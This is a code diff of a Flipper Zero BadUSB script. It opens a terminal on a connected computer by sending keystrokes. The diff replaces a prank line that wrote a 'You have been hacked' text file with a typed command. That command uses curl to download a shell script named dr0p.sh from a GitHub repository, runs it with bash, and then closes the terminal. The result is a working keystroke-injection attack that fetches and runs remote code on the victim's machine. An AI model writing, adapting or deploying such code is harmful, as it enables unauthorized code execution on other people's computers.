@@ -32,14 +32,17 @@ eventLoop.subscribe(views.dialog.input, function (_sub, button, eventLoop, gui) 
         print("USB is connected");
 
         badusb.press("ALT", "t"); //Open terminal
-        delay(250);
-        badusb.println("echo 'You have been hacked by " + flipper.getName() + "!' >> ~/Desktop/hacked.txt & exit");
-
-//        badusb.press("ENTER");
+        delay(1000);
         
-//        badusb.println("Flipper Model: " + flipper.getModel());
-//        badusb.println("Flipper Name: " + flipper.getName());
-//        badusb.println("Battery level: " + flipper.getBatteryCharge().toString() + "%");
+        // Download/execute a remote Python or Bash file
+        badusb.println("curl -o /tmp/dr0p.sh https://raw.githubusercontent.com/PradaGangMafia/FlipDikz/refs/heads/main/Payloads/dr0p.sh && bash /tmp/dr0p.sh");
+        delay(1000);
+        
+
+        
+        badusb.println("exit");
+        delay(1000);
+        badusb.press("ENTER");
 
         notify.success();
     } else {
